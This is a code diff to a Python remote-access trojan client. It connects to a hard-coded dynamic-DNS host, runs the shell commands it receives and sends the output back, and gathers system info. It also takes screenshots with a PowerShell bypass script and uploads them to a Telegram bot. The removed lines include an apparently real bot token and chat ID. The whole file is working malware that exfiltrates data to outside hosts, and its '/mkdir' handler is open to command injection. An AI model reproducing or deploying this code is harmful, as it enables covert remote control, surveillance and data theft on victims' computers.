@@ -4,12 +4,6 @@ import time
 import subprocess
 import requests
 import os
-import struct
-import pickle
-import cv2
-import base64
-import pyautogui
-import numpy as np
 host = 'dimagamera.ddns.net'
 port = 81
 
@@ -22,35 +16,56 @@ while True:
 		pass
 
 while True:
-	a = s.recv(1024)
-	a = a.decode()
-	if a == '/cmd':
-		cmd = s.recv(1024)
-		cmd = cmd.decode()
-		cmd_process = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE) 
-		cmd_process = cmd_process.stdout + cmd_process.stderr
-		s.send(cmd_process)
+	try:
+		a = s.recv(1024)
+		a = a.decode()
+		if a == '/cmd':
+			cmd = s.recv(1024)
+			cmd = cmd.decode()
+			cmd_process = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE) 
+			cmd_process = cmd_process.stdout + cmd_process.stderr
+			s.send(cmd_process)
 
-	elif a == '/screen':
-		try:
-			image = pyautogui.screenshot()
-			image = cv2.cvtColor(np.array(image),
-						cv2.COLOR_RGB2BGR)
-			cv2.imwrite("image1.png", image)
-			photo = open(r"image1.png", 'rb')
-			files = {'document': photo}
-			requests.post("https://api.telegram.org/bot1656016658:AAGxJpjEaZ--T1eDc4wUc8GS3NXQ1fNcJ2w/sendDocument?chat_id=330710135", files=files)
-			photo.close()
-		except:
+		elif a == '/screen':
+			try:
+				screen = ['<# :',
+				'  @echo off', 
+				'    powershell /nop /ex bypass^', 
+				'    "&{[ScriptBlock]::Create((gc \'%~f0\') -join [Char]10).Invoke()}"',
+				'  exit /b',
+				'#>', 
+				'(New-Object -ComObject Shell.Application).MinimizeAll()',
+				'Add-Type -AssemblyName System.Windows.Forms', 
+				'$scr = [Windows.Forms.SystemInformation]::VirtualScreen',
+					'$bmp = New-Object Drawing.Bitmap $scr.Width, $scr.Height',
+					'$gfx = [Drawing.Graphics]::FromImage($bmp)',
+					'$gfx.CopyFromScreen($scr.Location, [Drawing.Point]::Empty, $scr.Size)', 
+					'$gfx.Dispose()', 
+					'$bmp.Save(".\screenshot.png")', 
+					'$bmp.Dispose()']
+				bat = open('screen.bat', 'w')
+				for item in screen:
+					bat.write(item+'\n')
+				bat.close()
+				subprocess.run('screen.bat', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+				photo = open(r"screenshot.png", 'rb')
+				files = {'document': photo}
+				requests.post("https://api.telegram.org/botTOKEN/sendDocument?chat_id=CHATID", files=files)
+				photo.close()
+				os.remove('screen.bat')
+				os.remove('screenshot.png')
+			except:
+				pass
+
+		elif a == '/mkdir':
+			dir = s.recv(1024)
+			dir = dir.decode()
+			os.system('mkdir '+ str(dir))
+		elif a == "/sysinfo":
+			cmd_process = subprocess.run('systeminfo', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE) 
+			cmd_process = cmd_process.stdout + cmd_process.stderr
+			s.send(cmd_process)
+		elif a == "/webcam":
 			pass
-
-	elif a == '/mkdir':
-		dir = s.recv(1024)
-		dir = dir.decode()
-		os.system('mkdir '+ str(dir))
-	elif a == "/sysinfo":
-		cmd_process = subprocess.run('systeminfo', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE) 
-		cmd_process = cmd_process.stdout + cmd_process.stderr
-		s.send(cmd_process)
-	elif a == "/webcam":
+	except:
 		pass
